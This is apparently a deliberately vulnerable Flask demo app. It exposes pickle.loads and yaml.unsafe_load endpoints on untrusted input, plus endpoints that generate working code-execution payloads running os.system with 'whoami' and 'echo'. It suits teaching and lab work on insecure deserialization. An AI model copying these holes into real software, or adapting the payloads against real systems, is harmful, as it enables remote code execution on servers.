from flask import Flask, request, jsonify
import base64
import pickle
import yaml
import os

app = Flask(__name__)

# --- Pickle Vulnerability ---

class Exploit(object):
    def __reduce__(self):
        # This is a simple exploit that runs 'whoami' command.
        # In a real attack, this could be any malicious command.
        return (os.system, ("whoami",))

@app.route('/pickle', methods=['POST'])
def pickle_load():
    """
    This endpoint is vulnerable to insecure deserialization.
    It takes a base64 encoded pickle payload and deserializes it.
    """
    try:
        payload_b64 = request.get_json().get('payload')
        if not payload_b64:
            return "No payload provided", 400
        data = base64.b64decode(payload_b64)
        obj = pickle.loads(data)
        # The result of os.system("whoami") will be printed to the console
        # where the flask app is running. The return value of os.system is the exit code.
        return f"Pickle loaded. Check the console output of the Python server. Exit code: {obj}"
    except Exception as e:
        return f"An error occurred: {e}", 500

@app.route('/pickle/generate-exploit', methods=['GET'])
def generate_exploit():
    """
    This endpoint generates a sample malicious pickle payload.
    """
    exploit_payload = pickle.dumps(Exploit())
    exploit_payload_b64 = base64.b64encode(exploit_payload).decode('utf-8')
    return jsonify({"payload": exploit_payload_b64})


# --- PyYAML Vulnerability ---

@app.route('/yaml', methods=['POST'])
def yaml_load():
    """
    This endpoint is vulnerable to unsafe YAML deserialization.
    It uses yaml.unsafe_load, which can execute arbitrary code.
    """
    yaml_data = request.get_data(as_text=True)
    if not yaml_data:
        return "No YAML data provided", 400
    try:
        # The result of the command will be printed to the console.
        result = yaml.unsafe_load(yaml_data)
        return f"YAML loaded. Check the console output. Result: {result}"
    except Exception as e:
        return f"An error occurred: {e}", 500

@app.route('/yaml/generate-exploit', methods=['GET'])
def generate_yaml_exploit():
    """
    This endpoint returns a sample malicious YAML payload.
    """
    exploit_yaml = "!!python/object/new:os.system [echo 'YAML exploit successful!']"
    return jsonify({"payload": exploit_yaml})


if __name__ == '__main__':
    # Running on port 5001 to avoid conflict with React's default port 3000
    app.run(debug=True, port=5001)
